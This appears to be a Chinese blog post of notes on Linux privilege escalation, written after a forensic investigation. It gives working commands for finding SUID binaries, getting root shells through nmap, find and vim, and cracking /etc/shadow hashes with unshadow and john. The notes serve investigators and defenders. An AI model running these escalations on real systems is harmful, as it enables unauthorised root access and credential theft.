+++
title = 'Linux常用提权'
date = 2022-08-06T15:03:29+08:00
draft = false

+++

# suid提权

上回绿盟取证时发现入侵者有部分木马是root权限运行，取证时用的apache账号，权限不够。在多处发现攻击者可能通过python进行suid提取。所以总结下攻击者可能用到的suid提权。



1.查找root权限的二进制文件

find / -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;



\#SUID权限的设置只针对二进制可执行文件，可以通过`chmod u+s`、`chmod u-s`命令赋予、去掉二进制文件u权限。

\#SUID是Linux的特殊权限，u代替x执行权限，在执行时进程不是发起者，而是程序的所属者。



python

![img](https://image-1253434595.cos.ap-chengdu.myqcloud.com/img/202409241355579.png)

bash

![img](https://image-1253434595.cos.ap-chengdu.myqcloud.com/img/202409241355443.png)

cp（mv、wegt同理）

![img](https://image-1253434595.cos.ap-chengdu.myqcloud.com/img/202409241355419.png)

# 2.nmap

老版的nmap(2.02-5.21)有相互的功能--interactive

nmap> !sh

sh-3.2# whoami

root



# 3.find

touch test

find test -exec whoami \;



# 4.vim

如果vim以SUID运行，就会继承root用户的权限，可以读取系统中所有的文件

vim/vi

:shell

# 破解用户名密码

前置条件：当前能读取/etc/passwd、/etc/shadow

unshadow /etc/passwd /etc/shadow >passwd	#使用 unshadow 命令组合 /etc/passwd 和 /etc/shadow

![img](https://image-1253434595.cos.ap-chengdu.myqcloud.com/img/202409241355197.png)

john passwd	# 使用john破解

![img](https://image-1253434595.cos.ap-chengdu.myqcloud.com/img/202409241356400.png)





另外，反弹中需要利用python模拟tty终端才能使用su命令

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```













参考

https://www.cnblogs.com/hellobao/articles/17261531.html
